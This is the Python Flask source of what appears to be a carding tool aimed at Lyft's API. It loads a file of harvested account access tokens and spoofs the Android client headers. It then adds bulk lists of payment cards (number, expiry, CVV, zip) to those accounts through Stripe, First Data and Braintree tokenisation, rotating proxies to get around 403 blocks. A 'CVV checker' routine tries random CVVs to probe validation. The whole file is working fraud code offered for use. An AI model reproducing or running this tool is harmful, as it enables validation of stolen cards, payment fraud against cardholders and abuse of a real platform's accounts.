import json
import random
import string
import time
import requests
import base64
import os
from flask import Flask, render_template, request, jsonify
from datetime import datetime

app = Flask(__name__)

def random_string(length, chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'):
    return ''.join(random.choice(chars) for _ in range(length))

def generate_random_cvv():
    return f"{random.randint(0, 999):03d}"

def get_server_uri():
    if 'RENDER' in os.environ:
        return request.url_root.rstrip('/')
    else:
        base_url = request.url_root.rstrip('/')
        return base_url

def get_all_details_by_count(data, count=False, number=False):
    if not number:
        keys = list(data.keys())
        if count < len(keys):
            key = keys[count]
            return data[key]
    if number:
        return data.get(number)
    return None

def load_account_data():
    try:
        with open("userdata-1.json", "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"Error loading account data: {e}")
        return {}

def get_proxy_setting():
    proxy_req = request.form.get('proxy_toggle', 'off') or request.args.get('proxy_toggle', 'off')
    if proxy_req == 'on':
        try:
            with open("proxy.txt", "r") as f:
                return f.read().strip()
        except:
            return None
    return None

# Import and route tokens functionality
@app.route('/tokens', methods=['GET'])
def tokens_endpoint():
    from tokens import process_tokens
    return process_tokens()

# Import and route refresh functionality
@app.route('/refresh', methods=['GET'])
def refresh_endpoint():
    from refresh import refresh_token
    return refresh_token()

@app.route('/', methods=['GET', 'POST'])
def index():
    data = load_account_data()
    if not data:
        return render_template('index.html', error="File has no data")
    
    ol = int(request.args.get('ol', 0))
    number = request.args.get('number')
    
    details = get_all_details_by_count(data, ol, number)
    if not details:
        return render_template('index.html', error="Account over or Not Found")
    
    number = details.get('number')
    access_token = details.get('access_token')
    refresh_token = details.get('refresh_token')
    session_id = details.get('x-client-session-id')
    count1 = len(data) - 1
    
    if not access_token:
        return render_template('index.html', error="Account over or Not Found")
    
    submit_action = request.args.get('submit') or request.form.get('submit')
    
    if not submit_action or submit_action == "Back To Dashboard":
        return show_dashboard(data, ol, count1, number, access_token, session_id)
    elif submit_action == "Refresh_token":
        return refresh_token_page(ol, number)
    elif submit_action == "Get_Tokens":
        return process_single_card(ol, number, access_token, session_id, data, count1)
    elif submit_action == "Process_Sequential":
        return process_sequential_cards(data, count1)
    elif submit_action == "Process_CVV_Checker":
        return process_cvv_checker(data, count1)
    
    return show_dashboard(data, ol, count1, number, access_token, session_id)

def show_dashboard(data, ol, count1, number, access_token, session_id):
    time10 = random_string(10)
    time13 = str(int(time.time() * 1000))
    
    headers = {
        'User-Agent': f'lyft:android:13:2025.43.3.{time10}',
        'Accept': 'application/x-protobuf,application/json',
        'Accept-Encoding': 'gzip',
        'x-idl-source': 'pb.api.endpoints.charge_accounts.ReadChargeAccountsRequest',
        'authorization': f'Bearer {access_token}',
        'x-session': 'eyJhIjoiNDczZGQzNGY4MjA5NDMyZSIsImYiOiI5N2NiMmU1ZC05NmI0LTRlYTEtOTVjNC0wNGNlOGM4MzAyNjkiLCJoIjp0cnVlLCJrIjoiMzg2NjcwMzMtYzA2Mi00ZDAyLWIyNTYtOThmMDNhMmY2NThkIn0=',
        'x-client-session-id': session_id,
        'accept-language': 'en_IN',
        'user-device': 'Xiaomi Redmi Note 5 Pro',
        'x-locale-language': 'en',
        'x-locale-region': 'IN',
        'x-device-density': '440',
        'x-design-id': 'X',
        'x-location': '0.0,0.0',
        'x-timestamp-ms': time13,
        'x-timestamp-source': 'ntp; age=951059',
    }
    
    try:
        response = requests.get(
            'https://api.lyft.com/chargeaccounts',
            headers=headers,
            timeout=30
        )
        
        if response.status_code != 200:
            return render_template('index.html', 
                                error="Token may be expired",
                                ol=ol,
                                show_refresh=True)
        
        cards_data = response.json()
        cards = []
        if "chargeAccounts" in cards_data and cards_data["chargeAccounts"]:
            for card in cards_data["chargeAccounts"]:
                funding_type = card.get("fundingType", "Unknown")
                last_four = card.get("lastFour", "0000")
                card_type = card.get("type", "Unknown")
                cards.append({
                    'last_four': last_four,
                    'type': card_type,
                    'funding_type': funding_type
                })
        
        return render_template('index.html',
                            ol=ol,
                            count1=count1,
                            number=number,
                            cards=cards,
                            has_cards=bool(cards))
        
    except Exception as e:
        return render_template('index.html',
                            error=f"Error checking token: {str(e)}",
                            ol=ol,
                            show_refresh=True)

def refresh_token_page(ol, number):
    refresh_url = f"{get_server_uri()}/refresh?number={number}"
    try:
        response = requests.get(refresh_url)
        result = response.json()
        
        if result and result.get('status') == 'success':
            return render_template('index.html',
                                success="Token refreshed successfully!",
                                ol=ol,
                                number=number)
        else:
            return render_template('index.html',
                                error="Failed to refresh token",
                                ol=ol)
    except Exception as e:
        return render_template('index.html',
                            error=f"Error refreshing token: {str(e)}",
                            ol=ol)

def process_single_card(ol, number, access_token, session_id, data, count1):
    card_no = request.args.get('cardNo')
    exp_month = request.args.get('exp_month')
    exp_year = request.args.get('exp_year')
    cvv = request.args.get('cvv')
    zipcode = request.args.get('zipcode')
    
    proxy_toggle = request.args.get('proxy_toggle', 'off')
    proxy_param = 'yes' if proxy_toggle == 'on' else 'no'
    
    if not all([card_no, exp_month, exp_year, cvv, zipcode, session_id, access_token]):
        missing = []
        if not card_no: missing.append("Card number")
        if not exp_month: missing.append("Expiration month")
        if not exp_year: missing.append("Expiration year")
        if not cvv: missing.append("CVV")
        if not zipcode: missing.append("Zip code")
        if not session_id: missing.append("Session ID")
        if not access_token: missing.append("Access token")
        
        return render_template('index.html',
                            error=f"Missing required information: {', '.join(missing)}",
                            ol=ol,
                            count1=count1,
                            number=number)
    
    access_token_encoded = base64.b64encode(access_token.encode()).decode()
    
    tokens_url = f"{get_server_uri()}/tokens?cardNo={card_no}&exp_month={exp_month}&exp_year={exp_year}&cvv={cvv}&zipcode={zipcode}&SessionId={session_id}&access_token={access_token_encoded}&submit=Get_Tokens&proxy={proxy_param}"
    
    try:
        response = requests.get(tokens_url, timeout=30)
        result = response.json()
        
        print(f"Tokens API Response: {result}")
        print(f"Proxy parameter sent: {proxy_param}")
        
        stripe_token = result.get("stripe_id")
        first_data_token = result.get("first_data_key") 
        braintree_token = result.get("braintree_id")
        
        if 'error' in result:
            return render_template('single_result.html',
                                error=f"Tokens API Error: {result['error']}",
                                ol=ol,
                                count1=count1,
                                number=number,
                                card_no=card_no,
                                proxy_used=proxy_param)
        
        time.sleep(3)
        
        if all([stripe_token, first_data_token, braintree_token]):
            submit_url = f"{get_server_uri()}/tokens?cardNo={card_no}&exp_month={exp_month}&exp_year={exp_year}&cvv={cvv}&zipcode={zipcode}&SessionId={session_id}&access_token={access_token_encoded}&stripe_token={stripe_token}&first_data_token={first_data_token}&braintree_token={braintree_token}&proxy={proxy_param}&submit=Submit_card"
            
            response = requests.get(submit_url, timeout=30)
            response_data = response.json()
            
            print(f"Submit card response - Proxy: {proxy_param}, HTTP Code: {response_data.get('httpCode')}")
            
            if not response_data:
                return render_template('single_result.html',
                                    error="Invalid JSON response from card submission",
                                    ol=ol,
                                    count1=count1,
                                    number=number,
                                    card_no=card_no,
                                    proxy_used=proxy_param)
            
            http_code = response_data.get("httpCode")
            
            if http_code != 200:
                if http_code == 403:
                    return render_template('single_result.html',
                                        error="Please connect VPN OR PROXY",
                                        ol=ol,
                                        count1=count1,
                                        number=number,
                                        card_no=card_no,
                                        proxy_used=proxy_param)
                else:
                    return render_template('single_result.html',
                                        error=f"Something went wrong. HTTP Code: {http_code}",
                                        ol=ol,
                                        count1=count1,
                                        number=number,
                                        card_no=card_no,
                                        proxy_used=proxy_param)
            
            if response_data.get("success") == True:
                response_data_content = response_data.get("response_data", "")
                cards = []
                try:
                    if isinstance(response_data_content, str):
                        import html
                        cleaned_response = html.unescape(response_data_content)
                        card_data = json.loads(cleaned_response)
                    else:
                        card_data = response_data_content
                    
                    if card_data and "chargeAccounts" in card_data and card_data["chargeAccounts"]:
                        for index, card in enumerate(card_data["chargeAccounts"]):
                            funding_type = card.get("fundingType", "Unknown")
                            last_four = card.get("lastFour", "0000")
                            card_type = card.get("type", "Unknown")
                            product_code = f" ({card['productCode']})" if card.get("productCode") else ""
                            is_default = " ✓ Default" if card.get("default") else ""
                            
                            cards.append({
                                'index': index + 1,
                                'last_four': last_four,
                                'type': card_type,
                                'funding_type': funding_type,
                                'product_code': product_code,
                                'is_default': is_default
                            })
                    
                    return render_template('single_result.html',
                                        success="Card added successfully!",
                                        cards=cards,
                                        ol=ol,
                                        count1=count1,
                                        number=number,
                                        card_no=card_no,
                                        proxy_used=proxy_param)
                    
                except Exception as e:
                    return render_template('single_result.html',
                                        success="Card added successfully!",
                                        warning=f"Could not parse card details: {str(e)}",
                                        ol=ol,
                                        count1=count1,
                                        number=number,
                                        card_no=card_no,
                                        proxy_used=proxy_param)
            else:
                return render_template('single_result.html',
                                    error="Failed to add card - Success flag is false",
                                    ol=ol,
                                    count1=count1,
                                    number=number,
                                    card_no=card_no,
                                    proxy_used=proxy_param)
        else:
            return render_template('single_result.html',
                                error=f"Failed to get payment tokens<br>Stripe: {'✓' if stripe_token else '✗'} | First Data: {'✓' if first_data_token else '✗'} | Braintree: {'✓' if braintree_token else '✗'}",
                                ol=ol,
                                count1=count1,
                                number=number,
                                card_no=card_no,
                                proxy_used=proxy_param)
    
    except Exception as e:
        return render_template('single_result.html',
                            error=f"Error processing card: {str(e)}",
                            ol=ol,
                            count1=count1,
                            number=number,
                            card_no=card_no,
                            proxy_used=proxy_param)

def process_sequential_cards(data, count1):
    start_account = int(request.form.get('start_account', 0))
    end_account = int(request.form.get('end_account', count1))
    card_details_text = request.form.get('card_details', '')
    ol = request.form.get('ol', 0)
    proxy_toggle = request.form.get('proxy_toggle', 'off')
    proxy_param = 'yes' if proxy_toggle == 'on' else 'no'
    
    card_lines = card_details_text.strip().split('\n')
    cards = []
    
    for line in card_lines:
        line = line.strip()
        if line:
            parts = line.split('|')
            if len(parts) == 5:
                cards.append({
                    'cardNo': parts[0].strip(),
                    'exp_month': parts[1].strip(),
                    'exp_year': parts[2].strip(),
                    'cvv': parts[3].strip(),
                    'zipcode': parts[4].strip()
                })
    
    if not cards:
        return render_template('index.html',
                            error="No valid card details found. Please use format: cardNo|exp_month|exp_year|cvv|zipcode",
                            ol=ol)
    
    total_accounts = (end_account - start_account) + 1
    total_cards = len(cards)
    
    results = []
    card_index = 0
    
    for account_index in range(start_account, end_account + 1):
        if card_index >= total_cards:
            break
            
        account_details = get_all_details_by_count(data, account_index)
        
        if account_details:
            account_number = account_details['number']
            account_access_token = account_details['access_token']
            account_session_id = account_details['x-client-session-id']
            
            card = cards[card_index]
            
            result = process_card_for_account(
                card, card_index, total_cards,
                account_index, end_account, account_number,
                account_access_token, account_session_id,
                proxy_param
            )
            results.append(result)
            card_index += 1
        else:
            results.append({
                'type': 'error',
                'account_index': account_index,
                'message': 'Account not found or invalid'
            })
    
    return render_template('sequential_result.html',
                        sequential_results=results,
                        total_processed=card_index,
                        ol=ol,
                        proxy_used=proxy_param,
                        start_account=start_account,
                        end_account=end_account)

def process_cvv_checker(data, count1):
    start_account = int(request.form.get('cvv_start_account', 0))
    end_account = int(request.form.get('cvv_end_account', count1))
    card_details_text = request.form.get('cvv_card_details', '')
    ol = request.form.get('ol', 0)
    proxy_toggle = request.form.get('proxy_toggle', 'off')
    proxy_param = 'yes' if proxy_toggle == 'on' else 'no'
    
    card_lines = card_details_text.strip().split('\n')
    cards = []
    
    for line in card_lines:
        line = line.strip()
        if line:
            parts = line.split('|')
            if len(parts) == 5:
                cards.append({
                    'cardNo': parts[0].strip(),
                    'exp_month': parts[1].strip(),
                    'exp_year': parts[2].strip(),
                    'cvv': parts[3].strip(),
                    'zipcode': parts[4].strip()
                })
    
    if not cards:
        return render_template('index.html',
                            error="No valid card details found. Please use format: cardNo|exp_month|exp_year|cvv|zipcode",
                            ol=ol)
    
    total_accounts = (end_account - start_account) + 1
    total_cards = len(cards)
    
    results = []
    card_index = 0
    
    for account_index in range(start_account, end_account + 1):
        if card_index >= total_cards:
            break
            
        account_details = get_all_details_by_count(data, account_index)
        
        if account_details:
            account_number = account_details['number']
            account_access_token = account_details['access_token']
            account_session_id = account_details['x-client-session-id']
            
            card = cards[card_index]
            
            result = process_cvv_tests(
                card, card_index, total_cards,
                account_index, end_account, account_number,
                account_access_token, account_session_id,
                proxy_param
            )
            results.append(result)
            card_index += 1
        else:
            results.append({
                'type': 'error', 
                'account_index': account_index,
                'message': 'Account not found or invalid'
            })
    
    return render_template('cvv_result.html',
                        cvv_results=results,
                        total_processed=card_index,
                        ol=ol,
                        proxy_used=proxy_param,
                        start_account=start_account,
                        end_account=end_account)

def process_card_for_account(card, card_index, total_cards, account_index, end_account, 
                           account_number, account_access_token, account_session_id, proxy_param):
    card_no = card['cardNo']
    exp_month = card['exp_month']
    exp_year = card['exp_year']
    cvv = card['cvv']
    zipcode = card['zipcode']
    
    result = {
        'type': 'account_card',
        'account_index': account_index,
        'end_account': end_account,
        'account_number': account_number,
        'card_index': card_index,
        'total_cards': total_cards,
        'card_details': card,
        'tests': []
    }
    
    if all([card_no, exp_month, exp_year, cvv, zipcode, account_session_id, account_access_token]):
        access_token_encoded = base64.b64encode(account_access_token.encode()).decode()
        
        tokens_url = f"{get_server_uri()}/tokens?cardNo={card_no}&exp_month={exp_month}&exp_year={exp_year}&cvv={cvv}&zipcode={zipcode}&SessionId={account_session_id}&access_token={access_token_encoded}&submit=Get_Tokens&proxy={proxy_param}"
        
        try:
            response = requests.get(tokens_url, timeout=30)
            token_result = response.json()
            
            print(f"Sequential - Account {account_index}: Proxy={proxy_param}")
            
            stripe_token = token_result.get("stripe_id")
            first_data_token = token_result.get("first_data_key")
            braintree_token = token_result.get("braintree_id")
            
            time.sleep(3)
            
            if all([stripe_token, first_data_token, braintree_token]):
                submit_url = f"{get_server_uri()}/tokens?cardNo={card_no}&exp_month={exp_month}&exp_year={exp_year}&cvv={cvv}&zipcode={zipcode}&SessionId={account_session_id}&access_token={access_token_encoded}&stripe_token={stripe_token}&first_data_token={first_data_token}&braintree_token={braintree_token}&proxy={proxy_param}&submit=Submit_card"
                
                response = requests.get(submit_url, timeout=30)
                response_data = response.json()
                
                if not response_data:
                    result['tests'].append({
                        'type': 'error',
                        'message': 'Invalid JSON response',
                        'http_code': 'N/A'
                    })
                elif response_data.get("httpCode") != 200:
                    if response_data.get("httpCode") == 403:
                        result['tests'].append({
                            'type': 'error',
                            'message': "Please Connect Vpn Or Proxy",
                            'http_code': response_data.get("httpCode")
                        })
                    else:
                        result['tests'].append({
                            'type': 'error',
                            'message': f"HTTP Error: {response_data.get('response_data')}",
                            'http_code': response_data.get("httpCode")
                        })
                elif response_data.get("success") == True:
                    result['tests'].append({
                        'type': 'success',
                        'message': 'Successfully added!',
                        'http_code': response_data.get("httpCode")
                    })
                else:
                    result['tests'].append({
                        'type': 'error',
                        'message': f"Failed to add card (success flag false) <br> {response_data.get('response_data')}",
                        'http_code': response_data.get("httpCode")
                    })
            else:
                result['tests'].append({
                    'type': 'error',
                    'message': f"Failed to get payment tokens - Stripe: {'✓' if stripe_token else '✗'}, First Data: {'✓' if first_data_token else '✗'}, Braintree: {'✓' if braintree_token else '✗'}"
                })
                
        except Exception as e:
            result['tests'].append({
                'type': 'error',
                'message': f"Error: {str(e)}"
            })
    else:
        result['tests'].append({
            'type': 'error',
            'message': 'Missing required card information or account details'
        })
    
    return result

def process_cvv_tests(card, card_index, total_cards, account_index, end_account,
                     account_number, account_access_token, account_session_id, proxy_param):
    card_no = card['cardNo']
    exp_month = card['exp_month']
    exp_year = card['exp_year']
    correct_cvv = card['cvv']
    zipcode = card['zipcode']
    
    result = {
        'type': 'cvv_tests',
        'account_index': account_index,
        'end_account': end_account,
        'account_number': account_number,
        'card_index': card_index,
        'total_cards': total_cards,
        'card_details': card,
        'tests': []
    }
    
    if all([card_no, exp_month, exp_year, correct_cvv, zipcode, account_session_id, account_access_token]):
        access_token_encoded = base64.b64encode(account_access_token.encode()).decode()
        
        test_result = process_single_cvv_test(
            card_no, exp_month, exp_year, correct_cvv, zipcode,
            account_session_id, access_token_encoded, proxy_param,
            f"Correct CVV: {correct_cvv}", is_correct=True
        )
        result['tests'].append(test_result)
        
        for i in range(5):
            random_cvv = generate_random_cvv()
            test_result = process_single_cvv_test(
                card_no, exp_month, exp_year, random_cvv, zipcode,
                account_session_id, access_token_encoded, proxy_param,
                f"Random CVV: {random_cvv}", is_correct=False
            )
            result['tests'].append(test_result)
    
    return result

def process_single_cvv_test(card_no, exp_month, exp_year, cvv, zipcode,
                           session_id, access_token_encoded, proxy_param, test_name, is_correct):
    test_result = {
        'name': test_name,
        'is_correct': is_correct,
        'success': False,
        'message': '',
        'http_code': None
    }
    
    try:
        tokens_url = f"{get_server_uri()}/tokens?cardNo={card_no}&exp_month={exp_month}&exp_year={exp_year}&cvv={cvv}&zipcode={zipcode}&SessionId={session_id}&access_token={access_token_encoded}&submit=Get_Tokens&proxy={proxy_param}"
        
        response = requests.get(tokens_url, timeout=30)
        token_result = response.json()
        
        print(f"CVV Test - {test_name}: Proxy={proxy_param}")
        
        stripe_token = token_result.get("stripe_id")
        first_data_token = token_result.get("first_data_key")
        braintree_token = token_result.get("braintree_id")
        
        time.sleep(2)
        
        if all([stripe_token, first_data_token, braintree_token]):
            submit_url = f"{get_server_uri()}/tokens?cardNo={card_no}&exp_month={exp_month}&exp_year={exp_year}&cvv={cvv}&zipcode={zipcode}&SessionId={session_id}&access_token={access_token_encoded}&stripe_token={stripe_token}&first_data_token={first_data_token}&braintree_token={braintree_token}&proxy={proxy_param}&submit=Submit_card"
            
            response = requests.get(submit_url, timeout=30)
            response_data = response.json()
            
            if not response_data:
                test_result['message'] = 'Invalid JSON response'
            elif response_data.get("httpCode") != 200:
                if response_data.get("httpCode") == 403:
                    test_result['message'] = 'Please connect VPN OR PROXY'
                else:
                    if is_correct:
                        test_result['message'] = 'Failed to add card'
                    else:
                        test_result['message'] = 'Failed (expected with wrong CVV)'
                test_result['http_code'] = response_data.get("httpCode")
            elif response_data.get("success") == True:
                if is_correct:
                    test_result['success'] = True
                    test_result['message'] = 'Successfully added!'
                else:
                    test_result['message'] = 'Unexpected success with wrong CVV!'
                test_result['http_code'] = response_data.get("httpCode")
            else:
                if is_correct:
                    test_result['message'] = 'Failed to add card (success flag false)'
                else:
                    test_result['success'] = True
                    test_result['message'] = 'Expected failure with wrong CVV'
                test_result['http_code'] = response_data.get("httpCode")
        else:
            if is_correct:
                test_result['message'] = 'Failed to get payment tokens'
            else:
                test_result['success'] = True
                test_result['message'] = 'Failed to get payment tokens (expected with wrong CVV)'
                
    except Exception as e:
        test_result['message'] = f'Error: {str(e)}'
    
    return test_result

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=False, host='0.0.0.0', port=port)